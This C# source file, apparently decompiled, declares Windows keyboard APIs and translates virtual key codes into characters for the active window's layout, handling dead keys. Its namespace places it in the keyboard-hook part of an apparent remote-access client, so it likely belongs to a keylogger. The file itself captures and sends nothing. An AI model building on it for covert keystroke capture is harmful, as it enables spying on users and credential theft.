using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.Implementation;

namespace xClient.Core.MouseKeyHook.WinApi;

internal static class KeyboardNativeMethods
{
	internal enum MapType
	{
		MAPVK_VK_TO_VSC,
		MAPVK_VSC_TO_VK,
		MAPVK_VK_TO_CHAR,
		MAPVK_VSC_TO_VK_EX
	}

	public const byte VK_SHIFT = 16;

	public const byte VK_CAPITAL = 20;

	public const byte VK_NUMLOCK = 144;

	public const byte VK_LSHIFT = 160;

	public const byte VK_RSHIFT = 161;

	public const byte VK_LCONTROL = 162;

	public const byte VK_RCONTROL = 163;

	public const byte VK_LMENU = 164;

	public const byte VK_RMENU = 165;

	public const byte VK_LWIN = 91;

	public const byte VK_RWIN = 92;

	public const byte VK_SCROLL = 145;

	public const byte VK_INSERT = 45;

	public const byte VK_CONTROL = 17;

	public const byte VK_MENU = 18;

	public const byte VK_PACKET = 231;

	private static int lastVirtualKeyCode = 0;

	private static int lastScanCode = 0;

	private static byte[] lastKeyState = new byte[256];

	private static bool lastIsDead = false;

	internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int fuState, out char[] chars)
	{
		IntPtr activeKeyboard = GetActiveKeyboard();
		int scanCode = MapVirtualKeyEx(virtualKeyCode, 0, activeKeyboard);
		TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, activeKeyboard, out chars);
	}

	internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, out char[] chars)
	{
		IntPtr activeKeyboard = GetActiveKeyboard();
		TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, activeKeyboard, out chars);
	}

	internal static void TryGetCharFromKeyboardState(int virtualKeyCode, int scanCode, int fuState, IntPtr dwhkl, out char[] chars)
	{
		StringBuilder stringBuilder = new StringBuilder(64);
		KeyboardState current = KeyboardState.GetCurrent();
		byte[] nativeState = current.GetNativeState();
		bool flag = false;
		if (current.IsDown((Keys)16))
		{
			nativeState[16] = 128;
		}
		if (current.IsToggled((Keys)20))
		{
			nativeState[20] = 1;
		}
		switch (ToUnicodeEx(virtualKeyCode, scanCode, nativeState, stringBuilder, stringBuilder.Capacity, fuState, dwhkl))
		{
		case -1:
			flag = true;
			ClearKeyboardBuffer(virtualKeyCode, scanCode, dwhkl);
			chars = null;
			break;
		case 0:
			chars = null;
			break;
		case 1:
			if (stringBuilder.Length > 0)
			{
				chars = new char[1] { stringBuilder[0] };
			}
			else
			{
				chars = null;
			}
			break;
		default:
			if (stringBuilder.Length > 1)
			{
				chars = new char[2]
				{
					stringBuilder[0],
					stringBuilder[1]
				};
			}
			else
			{
				chars = new char[1] { stringBuilder[0] };
			}
			break;
		}
		if (lastVirtualKeyCode != 0 && lastIsDead)
		{
			if (chars != null)
			{
				StringBuilder stringBuilder2 = new StringBuilder(5);
				ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, stringBuilder2, stringBuilder2.Capacity, 0, dwhkl);
				lastIsDead = false;
				lastVirtualKeyCode = 0;
			}
		}
		else
		{
			lastScanCode = scanCode;
			lastVirtualKeyCode = virtualKeyCode;
			lastIsDead = flag;
			lastKeyState = (byte[])nativeState.Clone();
		}
	}

	private static void ClearKeyboardBuffer(int vk, int sc, IntPtr hkl)
	{
		StringBuilder stringBuilder = new StringBuilder(10);
		int num;
		do
		{
			byte[] lpKeyState = new byte[255];
			num = ToUnicodeEx(vk, sc, lpKeyState, stringBuilder, stringBuilder.Capacity, 0, hkl);
		}
		while (num < 0);
	}

	private static IntPtr GetActiveKeyboard()
	{
		int processId;
		return GetKeyboardLayout(ThreadNativeMethods.GetWindowThreadProcessId(ThreadNativeMethods.GetForegroundWindow(), out processId));
	}

	[DllImport("user32.dll")]
	[Obsolete("Use ToUnicodeEx instead")]
	public static extern int ToAscii(int uVirtKey, int uScanCode, byte[] lpbKeyState, byte[] lpwTransKey, int fuState);

	[DllImport("user32.dll")]
	public static extern int ToUnicodeEx(int wVirtKey, int wScanCode, byte[] lpKeyState, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, int wFlags, IntPtr dwhkl);

	[DllImport("user32.dll")]
	public static extern int GetKeyboardState(byte[] pbKeyState);

	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	public static extern short GetKeyState(int vKey);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern int MapVirtualKeyEx(int uCode, int uMapType, IntPtr dwhkl);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr GetKeyboardLayout(int dwLayout);
}
